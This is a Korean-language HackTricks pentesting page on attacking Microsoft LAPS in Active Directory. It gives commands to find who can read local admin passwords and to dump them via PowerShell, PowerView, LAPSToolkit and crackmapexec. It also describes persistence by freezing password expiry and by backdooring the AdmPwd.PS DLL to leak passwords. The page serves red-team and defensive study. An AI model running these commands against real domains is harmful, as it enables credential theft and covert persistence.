# LAPS

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고**되길 원하시나요? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점적인 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
* **[💬](https://emojipedia.org/speech-balloon/)** [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
* **해킹 요령을 공유하고 PR을 제출하여 [hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)에 참여**하세요.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## 기본 정보

로컬 관리자 비밀번호 솔루션 (LAPS)은 **고유하고 무작위로 생성되며 자주 변경되는 관리자 비밀번호**가 도메인에 가입된 컴퓨터에 적용되는 시스템을 관리하는 데 사용되는 도구입니다. 이러한 비밀번호는 Active Directory 내에서 안전하게 저장되며, 액세스 제어 목록 (ACL)을 통해 권한이 부여된 사용자만이 액세스할 수 있습니다. 클라이언트에서 서버로의 비밀번호 전송의 보안은 **Kerberos 버전 5** 및 **고급 암호화 표준 (AES)**을 사용하여 보장됩니다.

LAPS의 구현으로 인해 도메인의 컴퓨터 객체에는 **`ms-mcs-AdmPwd`** 및 **`ms-mcs-AdmPwdExpirationTime`** 두 가지 새로운 속성이 추가됩니다. 이러한 속성은 각각 **평문 관리자 비밀번호**와 **만료 시간**을 저장합니다.

### 활성화되었는지 확인
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS 비밀번호 액세스

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **LAPS 정책의 원본을 다운로드**할 수 있으며, 그런 다음 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지의 **`Parse-PolFile`**를 사용하여이 파일을 사람이 읽을 수있는 형식으로 변환 할 수 있습니다.

또한, **기본 LAPS PowerShell cmdlet**은 액세스 할 수있는 기계에 설치되어 있는 경우 사용할 수 있습니다:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView**를 사용하여 **비밀번호를 읽을 수 있는 사용자를 찾아내고 그 내용을 읽을 수 있는 사용자를 찾을 수도 있습니다**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)은 여러 기능을 통해 LAPS를 열거하는 것을 용이하게 합니다.\
하나는 **LAPS를 활성화한 모든 컴퓨터의 `ExtendedRights`를 구문 분석**하는 것입니다. 이를 통해 종종 보호 그룹에 속한 사용자인 **LAPS 암호를 읽을 수 있는 그룹**이 특별히 **위임**된 것을 보여줍니다.\
도메인에 컴퓨터를 가입시킨 **계정**은 해당 호스트에 대해 `All Extended Rights`를 받으며, 이 권한은 **암호를 읽을 수 있는 능력**을 부여합니다. 열거를 통해 호스트에서 LAPS 암호를 읽을 수 있는 사용자 계정을 보여줄 수 있습니다. 이를 통해 **특정 AD 사용자를 대상**으로 할 수 있습니다.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexec를 사용하여 LAPS 암호 덤프**
파워쉘에 액세스할 수 없는 경우 LDAP를 통해 원격으로 이 권한을 남용할 수 있습니다.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistence**

### **만료 날짜**

한 번 어드민이 되면 **암호를 획득**하고 **비밀번호 갱신을 방지**하기 위해 **만료 날짜를 미래로 설정**함으로써 사용자가 읽을 수 있는 모든 암호를 덤프할 수 있습니다.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
만약 **관리자**가 **`Reset-AdmPwdPassword`** cmdlet을 사용하거나 LAPS GPO에서 **정책에 필요한 것보다 긴 비밀번호 만료 시간을 허용하지 않음**이 활성화된 경우에도 비밀번호는 재설정됩니다.
{% endhint %}

### 배킹도어

LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으므로 코드에 배킹도어를 넣는 것이 가능합니다 (`Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부에 예를 들어) 새로운 비밀번호를 어떤 식으로든 **유출하거나 저장**할 수 있습니다.

그런 다음, 새로운 `AdmPwd.PS.dll`을 컴파일하고 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드하고 수정 시간을 변경하면 됩니다.

## 참고 자료
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 되기까지 AWS 해킹을 배우세요</summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으신가요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 얻으세요
* **[💬](https://emojipedia.org/speech-balloon/) 디스코드 그룹**에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
